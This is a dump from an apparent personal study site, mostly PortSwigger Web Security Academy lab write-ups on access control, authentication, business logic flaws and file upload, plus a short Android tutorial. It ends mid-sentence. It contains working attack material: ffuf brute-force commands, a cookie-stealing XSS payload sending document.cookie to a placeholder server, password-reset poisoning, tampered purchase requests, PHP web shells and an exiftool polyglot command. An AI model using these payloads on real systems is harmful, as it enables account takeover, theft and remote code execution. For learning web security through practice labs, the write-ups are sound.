\u003ccategory android:name=\"android.intent.category.BROWSABLE\" /\u003e {% if channel in ['stable', 'default'] %}\u003cdata android:scheme=\"googlechrome\" /\u003e{% endif %} \u003cdata android:scheme=\"http\" /\u003e \u003cdata android:scheme=\"https\" /\u003e \u003cdata android:scheme=\"about\" /\u003e \u003cdata android:scheme=\"javascript\" /\u003e \u003c/intent-filter\u003e ","the-application-layout#The application layout":"The MainActivity class is the entry point of our app, and it’s layout is the first interface that gets presented to the user when they click the app’s icon.\nThis behavior is defined in the AndroidManifest.xml file.\nThis way, when a user launches the app, android looks at the AndroidManifest file and knows that the first class to be launched is the MainActivity one.\nThe onCreate() method is called right after the activity is launched. The main point here is at line 17, where it’s calling the setContentView() function with a resource ID as a parameter.\nWe can navigate through the project’s file structure and find the layout file. In android applications, UIs are defined in the res/layout/ directory.\nBesides that raw format, Android Studio also allows us to edit the layout in a graphic way. We can alternate between the views in the upper navigation bar.\nDisplaying text on the screen Here we can assign an id to the TextView element on the layout, so we can reference it in our code.\nNow we can call the findViewById function with the ID we just assigned, storing a reference to the text element in a variable. Then, we can change the text value of the element using the setText() method.\nℹ️ The R class in Android is a dynamically generated class, which allows us to reference various resources. The main_text element of R.id was initialized because we assigned an ID to the TextView element in the activity_main layout. It seemed weird to me that TextView is being used as a data type, but I figured out later that this syntax is normal in this Java/Android context, as you have the primitive data types (such as int, float and char) and reference data types, which is the case of the TextView class. In this case, mainText is being declared as an instance of the TextView class."},"title":"Your First Android App"},"/book/portswigger/access-control/":{"data":{"":"Access control mechanisms, in the context of web applications, are those that limit the actions a user is able to perform. These mechanisms, to be secure, must necessarily be done in the server-side of the application, so that malicious users can’t bypass them by simply performing the sensitive requests manually.\nBroken Access Control vulnerabilities can lead to:\nVertical Privilege Escalation: when an attacker is able to perform actions that should be exclusive to users with higher privilege than their own Horizontal Privilege Escalation: when an attacker can perform actions in behalf of other users with the same privileges as them ","labs#Labs":"Unprotected admin functionality The application in this lab contained an exposed admin panel, which we could discover by looking on robots.txt.\nIt doesn’t perform any validation that could stop users from getting the contents of the panel, neither from performing the action of deleting another user’s account.\nUnprotected admin functionality with unpredictable URL In this case, the admin panel doesn’t have a guessable location, but there’s a disclose of it’s location on the page’s source code.\nThis is an example of why security by obscurity doesn’t work. Assuming that a page’s location will not be accessed because it has an unpredictable URL is flawed. Then, not performing any proper validation on the user’s role before letting them access the page is just naive.\nUser role controlled by request parameter This website manages admin access control by checking for the value of a cookie in the request. This way, we can intercept our requests and insert the Admin=true cookie in each of them, or simply edit the cookie’s value in the browser, allowing us to perform high-privilege operations.\nUser role can be modified in user profile When changing our account’s e-mail, it’s noticeable that it sends and returns a JSON. The first containing a field naturally called e-mail, and the other, having a roleid key-value pair.\nI then simply included that roleid pair in my request with the value of 2, granting myself permanent admin privileges.\nThe application probably defaults the value of roleId to 1 in the source code, but still accepts it to come from the client, not expecting it to be manipulated by a malicious user.\nUser ID controlled by request parameter After logging in and going to /my-account, we can see that our username is going as a GET parameter in the request.\nAfter noticing that, I intercepted the request to /my-account and edited it, adding the username of “carlos” as the account’s id, which allowed me to access another user’s account.\nUser ID controlled by request parameter, with unpredictable user IDs Although this lab uses unpredictable user ID’s, it discloses the user’s id in their posts.\nUser ID controlled by request parameter with data leakage in redirect Although the application redirects us to the login page if we try to access another user’s account, the redirect response still includes the content of the user’s account page.\nUser ID controlled by request parameter with password disclosure On my-account page, we can see that the password is filled in the input field. Although it’s hidden, we can see it in the page’s HTML.\nHere, we also have the same case of the previous lab, where we get redirected to the login page, but the contents of the 302 response still includes the contents of the requested page.\nInsecure direct object references This application allows us to get transcripts of the live chat.\nNoticing that the first transcript file’s ID is 2, we can repeat the GET request and try to get other files that weren’t generated by us.\nHere we get carlos’ password.\nURL-based access control can be circumvented This lab presents us an application that contains an unauthenticated admin panel, which contains restrictions disallowing external accesses to it. This restriction is likely checking the page’s location based on the URL being requested. However, it’s back-end is built in a framework that supports the X-Original-Url custom header. This header allows users to overwrite the path being explicitly accessed in the request, and therefore, bypass that restriction.\nAlthough receiving the status code 403 after the redirection, our action was performed anyway and the user was deleted.\nMethod-based can be circumvented By analyzing the workflow of upgrading a user’s role with an administrative account, we notice that the request uses the POST method.\nIf we attempt to repeat the request being logged in our regular, unprivileged user, we get 401 (unauthorized). However, if we send the same request, changing the method to GET and entering the data of the original request’s body in the URL, we are able to bypass the access control and grant ourselves admin privileges.\nMulti-step process with no access control on one step The lab gives us admin credentials, so we can analyze the account’s role upgrading process from there before actually exploring the vulnerability.\nHere, the process of upgrading a user’s role takes two steps: submitting the form and confirming the submission. Each step is handled by a different request.\nThe application successfully performs access control in the first step, but doesn’t do it in the second, which we can request directly, successfully bypassing access control.\nReferer-based access control In this case, after analyzing the process of upgrading user privileges, we can attempt performing the request as our own user, but passing the same Referer header as the legitimate request, tricking the application into assuming that the request was actually performed by the click of a button in the admin page.\nIt works."},"title":"Access Control"},"/book/portswigger/authentication/":{"data":{"":"","#":"Authentication vulnerabilities are those that may allow an attacker to gain unauthorized access to other user’s accounts on a given application. These vulnerabilities may arise on different scenarios, as follows.\nWeak password policy An application could simply not demand that users have a strong password. A strong password usually has many characters and includes capital letters, special characters and numbers. If the password isn’t strong, it’s more likely for an attacker being able to just guess the correct password of specific users, with or without a brute-force tool.\nDifferent failure responses When a user attempts to log-in an application, it will typically verify if the user exists in the database by checking for the specified username first, and then check if the provided password is correct for that same user.\nFor this simple scenario, there are two cases in which the authentication would fail. Either the username that is trying to be accessed doesn’t exist, therefore there’s no need to check for the password, or the username exists, but the password is incorrect.\nIt’s considered best practice not to give the user different responses between those two scenarios, as that information could be used by an attacker to enumerate valid usernames in the database.\nThose differences may be more clear on straight forward error messages, such as “Username does not exist” and different HTTP status codes, or more subtle, like on almost unnoticeable different content on the web page or even different response times for each submission. For different times, an attacker can try entering an excessively long password that the website takes noticeably longer to handle. For that last scenario, it’s important for the attacker to repeat the request that took longer to handle a couple of times, until they are sure that the longer response time isn’t due to any other reasons.","common-obstacles#Common obstacles":"There are many options to protect an application from brute-force attacks, but if they’re implemented with flawed logic, the application might still be susceptible to this kind of attack.\nIP Block An application may try to mitigate brute-force attacks by implementing an IP Block mechanism, which will basically disallow the user of making further login attempts after a certain number of failed submission of credentials based on their IP. The problems with that method arise when it accepts user input as a valid source for the user’s IP, such as the HTTP X-Forwarded-For header.\nBypassing IP block with “X-Forwarded-For” header The X-Forwarded-For header is used by the server in order to identify the original source of the request in case the client uses a proxy server. However, an attacker can manipulate this header in order to pretend that they are sending the request from a different IP. If the application accepts that header as a valid identifier of the user, it can be bypassed by attackers. This is a simple technique of IP address spoofing.\nIn order to bypass that kind of IP block, an attacker can set a different, made-up value for the X-Forwarded-For header for each attempt, As you can see on the Payload 1 column below.\nBypassing IP block with valid credentials In some cases, the application might reset the counting of failed attempts if the attacker enter valid credentials, regardless the account. This way, an attacker might be able to bypass IP block by logging into their own account after every few attempts, allowing them to continue the attack.\nIn case the number of wrong attempts that triggers the IP blocker is three, the attacker’s wordlists could look like this:\nUsername wordlist: 1 \u003cusername1\u003e 2 \u003cusername2\u003e 3 \u003cvalid-username\u003e 4 \u003cusername3\u003e 5 \u003cusername4\u003e 6 \u003cvalid-username\u003e 7 ... Password wordlist: 1 \u003cpassword1\u003e 2 \u003cpassword2\u003e 3 \u003cvalid-password\u003e 4 \u003cpassword3\u003e 5 \u003cpassword4\u003e 6 \u003cvalid-password\u003e 7 ... Rate limiting User rate limiting consists on the web application limiting the amount of requests a user can make on a specific range of time.\nBypassing rate limit by sending multiple credentials in the same request On the following example, the application uses a JSON object to receive the credentials, and the attacker is able to enter an array containing their password wordlist, so the application will try all the elements in the array until one of them logs the user in successfully. This is probably due to the back-end code not performing a kind of comparison that only works with strings. I would risk saying that the fact that it accepts an array as the value of password is already wrong.\nAccount locking Another common method for mitigation of brute-force attacks is to lock the account for which there might be the possibility of an ongoing attack, making it inaccessible for anyone trying to log-in to it for a certain amount of time, which makes the attack harder, as the attacker would need to wait until the lock’s timer ends in order to try a different password and proceed with the hack. However, if not handed properly, that method could lead to the disclosure of the account’s existence.\nEnumerating usernames with different response from account locking It’s well-known that sending default and generic error messages is considered best practice when it comes to web security, and that principle is no different when it comes to account locking. If an application gives signs, such as a different error message, that it is blocking an account, that information can be used by attackers to enumerate existing accounts in the server.\nOn the following example, by repeating the authentication attempts five times for each username in the wordlist, the application sends a different error message for a specific user after the third guess, which in this case means that it has locked that specific user’s account in attempt to prevent a brute-force attack. That different error message is sufficient for the attacker to notice that the account exists in the database.\n2FA (two-factor authentication) Consists in using more then one single information (such as the password) in order to identify the an user’s authentication as valid.\nBypassing front-end validated 2FA On the case below, the application attempts implementing two-factor authentication, but does using it a flawed logic. It only does the validation on the application’s front-end. So, after successfully guessing the victim’s password, the attacker could simply try accessing other pages on the site and be already logged in, as the application has already set the session cookie to the attacker, considering them as authenticated.\nTaking advantage from 2FA with flawed logic In case the web server doesn’t verify that the user that submitted the first credentials and the one entering the 2FA code are the same, attacks might be possible.\nOn the example bellow, the web application doesn’t check if the user prompting for a 2FA code actually tried to log in, allowing us to generate a code without providing the user’s password, and then brute-force that code, managing to log into the victim’s account.\nNow we can take our own 2FA code submission as sample to brute-force Carlos’s.","exploiting#Exploiting":"Enumerating usernames In order to enumerate valid usernames for an application, firstly we need to try logging into an account that probably doesn’t exist. Then we can get the response for that attempt as a model for invalid usernames. On the following example, the website returns the following error message: “Invalid username or password.”\nFor the username “as”, this application returned the same error message, but the period was missing. That is a slight mistake that could happen on the development phase of a website, but it’s enough for an attacker to figure that the response is different because the guessed username is actually valid.\nBrute-forcing user’s password By having previous knowledge of a username and a list of possible passwords, an attacker could be able to guess the correct password with brute-force scripts. In the following example, ffuf is used in order to perform the attack and get information about the responses for each password in the provided wordlist.\n$ ffuf -u https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login --data \"username=as\u0026password=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\" -X POST -x http://127.0.0.1:8080 -w ~/tools/wordlists/burp/password.txt -mc all /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0 ________________________________________________ :: Method : POST :: URL : https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login :: Wordlist : FUZZ: /home/zetsu/tools/wordlists/burp/password.txt :: Header : Content-Type: application/x-www-form-urlencoded :: Data : username=as\u0026password=FUZZ :: Follow redirects : false :: Calibration : false :: Proxy : http://127.0.0.1:8080 :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: all ________________________________________________ qazwsx [Status: 200, Size: 3248, Words: 1329, Lines: 66] 111111 [Status: 200, Size: 3235, Words: 1320, Lines: 65] 123321 [Status: 200, Size: 3251, Words: 1329, Lines: 66] zxcvbnm [Status: 200, Size: 3251, Words: 1329, Lines: 66] michael [Status: 200, Size: 3234, Words: 1320, Lines: 65] 123123 [Status: 200, Size: 3235, Words: 1320, Lines: 65] 121212 [Status: 200, Size: 3249, Words: 1329, Lines: 66] password [Status: 200, Size: 3232, Words: 1320, Lines: 65] 1234 [Status: 200, Size: 3231, Words: 1320, Lines: 65] asdfgh [Status: 200, Size: 3250, Words: 1329, Lines: 66] football [Status: 200, Size: 3249, Words: 1329, Lines: 66] batman [Status: 200, Size: 3235, Words: 1320, Lines: 65] 12345 [Status: 200, Size: 3233, Words: 1320, Lines: 65] 123qwe [Status: 200, Size: 3234, Words: 1320, Lines: 65] sunshine [Status: 200, Size: 3250, Words: 1329, Lines: 66] andrew [Status: 200, Size: 3234, Words: 1320, Lines: 65] 1234567 [Status: 200, Size: 3233, Words: 1320, Lines: 65] tigger [Status: 200, Size: 3233, Words: 1320, Lines: 65] iloveyou [Status: 200, Size: 3251, Words: 1329, Lines: 66] 2000 [Status: 302, Size: 0, Words: 1, Lines: 1] charlie [Status: 200, Size: 3235, Words: 1320, Lines: 65] robert [Status: 200, Size: 3250, Words: 1329, Lines: 66] thomas [Status: 200, Size: 3233, Words: 1320, Lines: 65] taylor [Status: 200, Size: 3248, Words: 1329, Lines: 66] matrix [Status: 200, Size: 3232, Words: 1320, Lines: 65] austin [Status: 200, Size: 3233, Words: 1320, Lines: 65] monitoring [Status: 200, Size: 3232, Words: 1320, Lines: 65] montana [Status: 200, Size: 3231, Words: 1320, Lines: 65] moscow [Status: 200, Size: 3250, Words: 1329, Lines: 66] moon [Status: 200, Size: 3232, Words: 1320, Lines: 65] :: Progress: [100/100] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 :: Then we can see that most of the attempts returned the status code 200 and try running the command again, filtering the results by the status code, leaving us with the only attempt that returned a different one:\n$ ffuf -u https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login --data \"username=as\u0026password=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\" -X POST -x http://127.0.0.1:8080 -w ~/tools/wordlists/burp/password.txt -mc all -fc 200 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0 ________________________________________________ :: Method : POST :: URL : https://0abe006d04dc5ca680dcdab900bd0038.web-security-academy.net/login :: Wordlist : FUZZ: /home/zetsu/tools/wordlists/burp/password.txt :: Header : Content-Type: application/x-www-form-urlencoded :: Data : username=as\u0026password=FUZZ :: Follow redirects : false :: Calibration : false :: Proxy : http://127.0.0.1:8080 :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: all :: Filter : Response status: 200 ________________________________________________ 2000 [Status: 302, Size: 0, Words: 1, Lines: 1] :: Progress: [100/100] :: Job [1/1] :: 100 req/sec :: Duration: [0:00:01] :: Errors: 0 :: Exploiting flawed logic in password reset Some applications may include a verification step in the password reset mechanism by sending an e-mail to the user that requested the reset. That link typically includes a token in the URL that allows the user to actually perform the password reset after clicking it. However, if the application does not assign that token to a specific user, it might be possible to use the token to reset the password of other users.\nBy following the first steps to reset our password, we get access to this page through a link sent to our e-mail account. On this page, we are able to enter the new password and intercept the request, so we can view and edit it.\nBy changing the value of the username parameter to carlos, we are able to reset Carlos’s password to the one we entered. Now it’s just a matter of logging into their account.\nBrute-forcing a stay-logged-in cookie Most applications with authentication mechanisms include a small checkbox, usually labeled as “Remind me” or “Keep me logged in”, which allow the user not to lose their authenticated state after restoring the browser session.\nSome of them do that by assigning a cookie to the user, which it will later read and use to consider the user authenticated.\nIf the cookie has a low-entropy value, as the encoding value of the concatenated account credentials, an attacker could try brute-forcing the value of that cookie, managing to gain access to the user’s account without even going through the authentication process.\nIn the example below, we already have a victim whose username is “carlos” and a list of candidate passwords. By analyzing the stay-logged-in cookie assigned to ourselves after we clicked the checkbox during the authentication of our own account, we’ve noticed that it consists in the base64 encoding of our username, followed with a coma and a MD5 hash, that translates to our password. With that in mind, we know that we basically need to hash our list of candidate passwords, add username and a comma to the beginning of each hash, and then encode each new line to base64 in order to perform our attack.\nFor this case, we can use the presence of the “Update e-mail” button as an indicator that we’ve successfully logged in.\nI’ve also written a python exploit for this lab, which you can find here.\nStealing stay-logged-in cookie with XSS XSS can also be used to stay session cookies from users. Sometimes we are able to inject an XSS payload that forwards the cookies of whoever accesses the page with injected scripts to a server under our control.\nFor that, we can write an HTML image tag like the following:\n\u003cimg src=x onerror=this.src=\"http://\u003cYOUR_SERVER_IP\u003e/?c=\"+document.cookie\u003e\nThis tag is basically injecting an image on the page with “x” as it’s source. As there’s no such path called “x”, the onerror event will be triggered, causing the victim’s browser to look for the new image’s source in the provided URL. That URL is our web server. We are leading the victim’s browser to fetch the server with the “c” parameter having the value of document.cookie (the victim’s cookies). Then we just need to access our server’s access log and look for the part where the cookie is located on each access. With that cookie in hand, we are able to either inject it into our browser to log-in the victim’s account or try cracking the hash to recover their actual password.\nPassword reset poisoning via middleware Some application generate dynamic URLs for the password reset feature. Those applications might be vulnerable to password reset poisoning via middleware.\nThis is the password reset link sent by e-mail when submitting the password reset form, containing either the user’s username or e-mail.\nGET /forgot-password?temp-forgot-password-token=e7e5umk9suti5r2ddxfnybd78hnhk8pk HTTP/2 Host: 0a7700be036a44be81c243b9008400ef.web-security-academy.net When clicking the link, this request is generated. It contains a token unique to the user. If we are able to modify the Host header for this request, we can set it to point to a server under our control.\nOn the image above, we were able to intercept the form submission and set the X-Forwarded-Host value to our own server, besides setting “carlos” as the username. This request will generate a password reset link containing Carlos’s token and send it to us if he clicks it.\nAfter a while, we checked our server’s access log and noticed that we have gotten a request containing the token as the value of a query parameter.\nNow we were able to repeat our previous request (the one that happened when we clicked the reset link in our e-mail), but change the token’s value to Carlos’s. The response is a page were we are able to set the new password for Carlos’s account, then we are able to get full access to his account and probably to remove his own access.\nPassword brute-force via password change Some applications that contain password reset features fail to make the reset page inaccessible to unauthenticated users. If that’s the case, there’s a chance that the application is vulnerable to username enumeration or password brute-force.\nIn the image below, you can see that the application locks our account in case we provide the wrong current password, but it doesn’t lock it if we enter two different new passwords. We can take advantage of that, plus the fact that the username is provided in a hidden field in the POST request, in order to brute-force a password.\nWe can set an attack targeting carlos. Here we set two different passwords on the fields and set the part of the page containing the error message (Current password is incorrect) as our indicator. If the message changes, we have successfully figured out the victim’s password.\nHere we can notice that the password “mobilemail” has passed the current password check and fell into the new password check. Now we can use it to get access to the victim’s account."},"title":"Authentication"},"/book/portswigger/business-logic/":{"data":{"":"Business logic vulnerabilities are those that arise from the flawed assumption of the user’s behavior, failing to include the appropriate security mechanisms in the application’s logic and allowing attackers to take advantage of it.\nThere’s yet one lab from this topic that I didn’t complete: Authentication bypass via encryption oracle.\nI intend on doing this lab soon and publishing the solution here.","labs#Labs":"Excessive trust in client-side controls The following shopping application checks for the product’s value based on information included in the client side of the application, allowing attackers to craft and edit requests before they are sent do the server, and consequently purchasing products with arbitrary prices.\nOriginal add to cart request:\nPOST /cart HTTP/2 Host: 0aee00ab0420f09280afcb6f00450037.web-security-academy.net Cookie: session=6ftRjffxKFYAX6oK6N1CJYwKcqNggNI4 Content-Length: 49 Cache-Control: max-age=0 Sec-Ch-Ua: Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"\" Upgrade-Insecure-Requests: 1 Origin: https://0aee00ab0420f09280afcb6f00450037.web-security-academy.net Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 productId=1\u0026redir=PRODUCT\u0026quantity=1\u0026price=133700 Edited request with product’s price set to $00.01\nPOST /cart HTTP/2 Host: 0aee00ab0420f09280afcb6f00450037.web-security-academy.net Cookie: session=6ftRjffxKFYAX6oK6N1CJYwKcqNggNI4 Content-Length: 49 Cache-Control: max-age=0 Sec-Ch-Ua: Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"\" Upgrade-Insecure-Requests: 1 Origin: https://0aee00ab0420f09280afcb6f00450037.web-security-academy.net Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 productId=1\u0026redir=PRODUCT\u0026quantity=1\u0026price=0001 The application also doesn’t perform any actions in the checkout action in order to check if the product’s price is correct.\nHigh-level logic vulnerability The shopping application below performs the following POST request when a user removes an item from their cart:\nPOST /cart HTTP/2 Host: 0ade003a0376404b8243e26b006f00e3.web-security-academy.net Cookie: session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg Content-Length: 34 Cache-Control: max-age=0 Sec-Ch-Ua: Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"\" Upgrade-Insecure-Requests: 1 Origin: https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net/cart Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 productId=1\u0026quantity=-1\u0026redir=CART It follows the same logic from the request used to add one item to the user’s cart, but with a negative value, subtracting the item.\nThis may seem okay, as the button that removes the item from the cart is not present when the cart is empty, but this doesn’t stop the client to send that same request again, but with the empty cart, resulting in the application to ad -x items to the user, and consequently, also a negative value relative to the amount of items added.\nPOST /cart HTTP/2 Host: 0ade003a0376404b8243e26b006f00e3.web-security-academy.net Cookie: session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg Content-Length: 36 Cache-Control: max-age=0 Sec-Ch-Ua: Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"\" Upgrade-Insecure-Requests: 1 Origin: https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 productId=2\u0026quantity=-229\u0026redir=CART However, it does check the value of the cart before checkout, so we still don’t get infinite money. We can instead add an item with a high value that covers the negative we now have on the cart, allowing us to purchase that new item for an extremely lower price.\nPOST /cart HTTP/2 Host: 0ade003a0376404b8243e26b006f00e3.web-security-academy.net Cookie: session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg Content-Length: 36 Cache-Control: max-age=0 Sec-Ch-Ua: Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: \"\" Upgrade-Insecure-Requests: 1 Origin: https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 productId=1\u0026quantity=1\u0026redir=CART Inconsistent security controls Sometimes, the security controls for specific functionalities are implemented with a flawed logic. On the case below, the application allow users with a specific e-mail domain to access an admin panel on the website. Although the application sends a confirmation link to the e-mail provided in registration, it doesn’t check it when the user changes their e-mail for an existing account.\nIt also contains an information disclosure right on the register page, making the exploitation much easier.\nFlawed enforcement of business rules In this case, the application has made two coupons available: NEWCUST5 and SIGNUP30.\nIt does check if the coupon that the user is trying to apply is already applied, but fails to do it if the user alternates between the two coupons. The reason for this behavior is that the application is probably checking for the last applied coupon, instead of running through the set of applied ones and verifying if the one being attempted is already there, which would be more appropriate.\nLow-level logic flaw By the time I did this lab, the only thing I’d wrote about it was “integer overflow”, followed by the screenshot below.\nAs I don’t want to just drop it here without explanation, I’ll attempt to summarize the concept.\nBasically, some programming languages have a limit for the value that a signed integer variable can store. This is due to the fact that the maximum size of that integer variable is defined by a certain amount of bytes.\nIn this case, from what I’ve seen in the lab’s solution, that limit would be of either 2,147,483,647 or -2,147,483,648. These are the maximum and minimum possible values for a 16 bit signed integer. If the type was of an unsigned integer, it would be able to hold up until 4,294,967,295, but no negative values.\nIn this lab, the idea was that when you reached a certain amount of products of a specific value, the total value of the cart would reach the mentioned limit of 2,147,483,647, and after reaching it (or getting close to it), the next product added to the cart would cause an overflow, making the cart’s total value loop back to -2,147,483,648. Then, it would be necessary to keep adding products until that value reached a little more than zero, so we could buy everything basically for free.\nWhat I believe that happened to me while doing this lab is that I got tired of trying to use that concept in my favor, to a point where I just kept intruder running and adding products until the cart’s value got close to zero, and then added a few more products manually to make it get to the value that I wanted.\nI regret not writing the most accurate solution here, but I would advise the reader to go check the original solution, or even exploring this concept further. It is really interesting, and before that lab I thought it would only be applied in binary exploitation situations for desktop programs in low-level languages.\nHere’s the link to the lab, and here’s a WikiPedia page that I found to be a very interesting reading.\nInconsistent handling of user input In this one, the application also gives higher privileges to users under the e-mail @dontwannacry.com.\nHowever, it strips the user’s e-mail to 255 characters after signing up\nIt strips the user’s e-mail to 255 characters after registering though, which allows the attacker who can create subdomains in their e-mail client to craft such payload:\nusername=banana\u0026email=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaa%40dontwannacry.com.exploit-0a3300950473acc2813a062c01030059.exploit-server.net\u0026password=banana The e-mail’s length reaches 255 characters before the actual e-mail domain starts, so after checking for the user’s e-mail, it will grant the high privileges to the user.\nThis behavior could occur on implementations using old databases or programming languages that had the first byte of a string value being the representation of the number of characters in that string. Therefore, as the highest integer that can be represented in a single byte is 256, a 256-byte-long string would only contain 255 characters in it’s value, because the first byte would be 11111111, indicating a string with the maximum length.\nWeak isolation on dual-use endpoint On this example, the application performs a POST request in order to change a given user’s password.\nAlthough it the application checks for the current password, this parameter isn’t actually required, so we can just repeat the request without it, changing the password of an arbitrary user.\nInsufficient workflow validation On this lab, we can simply add the desired item to our cart and then hit the order confirmation endpoint, which doesn’t perform any validation about our balance, allowing us to purchase any items we want.\nAuthentication bypass via flawed state machine After sending the login credentials, the application redirects us to /role-selector upon success.\nIf we use intercept to go through the login steps, we are able to drop the GET /role-selector request, making so it’s never sent.\nThis way, when we go back to the application, we have received the default role, which is admin.\nInfinite money logic flaw In this case, the application gives us a coupon that gives us 30% OFF over anything we buy if we sign up to the store’s newsletter. However, we can also buy a 10$ gift card. This is a logic flaw, as a malicious user could repeatedly buy a lot of gift cards and submit the coupon on checkout, thus generating infinite money."},"title":"Business Logic"},"/book/portswigger/file-upload/":{"data":{"":"File upload vulnerabilities arise when a website allows users to upload files to the server without properly validating it’s content.","exploiting#Exploiting":"Lab: Remote code execution via web shell upload On the example below, the web application doesn’t have any restrictions for files uploaded as user profile pictures. This makes us able to send a PHP file, containing \u003c?php echo file_get_contents('/home/carlos/secret'); ?\u003e, which returns the content of the secret file stored in the server when we make a request to the uploaded file.\nBypassing MIME type filter Lab: Web shell upload via Content-Type restriction bypass Some applications may try to check if the MIME type of the file being sent is the expected by looking at the value of the Content-Type header on the request. The problem with that is that users can easily change the value of that header to the one that the server is expecting to receive.\nBypassing unavailable execution on uploads directory Lab: Web shell upload via path traversal Some applications may try to prevent RCE by file upload by configuring the web server to not execute files located in the directory where the users uploads their files. However, if the website also contains a path traversal vulnerability in the upload request, an attacker could try to upload the image to a higher directory within the hierarchy and then execute it.\nURL-encoded traversal sequence, file uploaded to /files/shell.php Executed the code\nInsufficient Blacklisting Blacklisting is a tricky practice for defensive mechanisms, as it is difficult for the developer to predict every single dangerous file extension. Some less known file extensions, but yet malicious, can be used in order to bypass blacklisting.\nBypassing blacklisting by uploading .htaccess file In some cases, the application fails to prevent users from uploading a configuration file. In the Apache server, there is a method for setting directory-specific configuration, which is through the .htaccess file. By manipulating this file, we can map a custom arbitrary file extension to the file type that we are trying to execute.\nLab: Web shell upload via extension blacklist bypass In the example below, we are able to upload a .htaccess file in order to set this kind of configuration.\nWhat we are doing is basically telling Apache that every file with the l337 extension must be treated as a php file.\nBypassing blacklisting with filename obfuscation Another method that could be used to bypass the extension blacklisting would be to include certain characters in the filename to trick the server into trusting the file sent as the expected one.\nSome useful techniques are:\nMultiple extensions: by providing something like filename.php.jpg the server could interpret the file as either an image or a PHP file.\nAdding trailing characters: some mechanisms might stripe trailing characters, such as dots, whitespaces and slashes after going through the filter, which would allow the file to still be executed, Example: filename.php.. This payload could still be executed if the mechanism for checking extensions considers hp. as the file extension, in the case it checks only the last three characters.\nAdding uppercase characters: if the server’s filter is case-sensitive, but the part of it that maps file extensions isn’t, you could also try providing a filename like filename.pHp.\nURL encoding: URL encoding (or double URL encoding) the dots could also be useful. Example: filename%2Ephp.\nNested extension: if the website strips the .php extension non-recursively, it could be possible to enter filename.p.phphp. It would strip the inner extension, but the outer one would stay and work normally.\nCopied from PortSwigger:\nTry using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.\nEnding the filename: you could try tricking the server into ignoring the rest of the filename by using a semicolon or a URL encoded null byte (%00). The full filename would be parsed to the filter, but the last part would be striped afterwords.\nLab: Web shell upload via obfuscated file extension Null byte technique\nBypassing content checking A more effective way of preventing against malicious files is to try checking a file’s content for attributes inherent to images. In this case, an attacker could still try to insert malicious code within an image’s metadata using a tool such as ExifTool.\nexiftool -Comment=\"\u003c?php echo 'START ' .file_get_contents('/home/carlos/secret') . ' END'; ?\u003e\" \u003cYOUR-INPUT-IMAGE\u003e.jpg -o polyglot.php # START and END will be useful in order to facilitate the content's visualization. # The image will be saved as \"polyglot.php\" The command above edits an image and inserts a PHP code as the “Comment” value of the image’s metadata. When we access the file, that part of it will be replaced with the contents of the file fetched in the PHP code.\nLab: Remote code execution via polyglot web shell upload Bypassing checks via race condition Lab: Web shell upload via race condition On this lab, there are many restrictions on file upload, but we can bypass them by sending the request that uploads the file and the one that accesses it at the same time.\nAs we can see in the lab’s hint, the PHP script responsible for the file upload function moves 